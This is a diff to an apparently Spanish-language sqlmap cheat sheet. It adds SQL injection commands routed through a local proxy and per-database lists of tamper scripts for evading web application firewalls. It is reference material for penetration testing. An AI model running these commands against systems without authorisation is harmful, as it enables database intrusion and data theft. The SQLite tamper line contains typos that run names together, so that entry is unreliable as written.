@@ -76,6 +76,11 @@ sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --banner
 sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
 ```
 
+#### Enviar las peticiones a nuestro propio proxy
+```
+sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --dbs
+```
+
 #### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
 ```
 sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs
@@ -83,6 +88,30 @@ sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs
 sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --no-cast --dbs
 
 sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=2 --level=3 --tamper=space2comment,randomcase,between --no-cast --dbs
+
+sqlmap -u "<URL>" -p <PARAMETER> --cookie="name:value" --threads=2 --no-cast -A "NONE" --proxy=http://localhost:8080 --tamper=space2comment,randomcase,between,charencode --not-string='A database error has been detected and fowarded to system admin.' --level=3 --risk=2 --dbms=mysql -v 3 --dbs
+```
+
+## Tampers
+
+#### MSSQL
+```
+--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+```
+
+#### MySQL
+```
+--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+```
+
+#### PostgreSQL
+```
+--tamper=xforwardedfor,space2comment,space2plus,space2randomblank,between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere
+```
+
+#### SQLite
+```
+--tamper=space2plus,unionalltounion.unmagicquotes,xforwardedfor,ifnull2ifisnull,randomcase,securesphere,space2comment,space2dashmmultiplespaces,nonrecursivereplacement 
 ```
 
 ---
